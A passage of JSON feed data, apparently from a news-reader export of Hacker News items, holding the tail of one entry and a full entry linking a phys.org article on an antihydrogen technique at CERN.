href=\"https://iosdev.space/@dvrzan\">Mastodon</a> if you have any questions, comments, or feedback.</p>","contentLength":9112,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46024302"},{"title":"Physicists drive antihydrogen breakthrough at CERN","url":"https://phys.org/news/2025-11-physicists-antihydrogen-breakthrough-cern-technique.html","date":1763844846,"author":"naves","guid":134,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46018159"}],"tags":["dev","hn"]}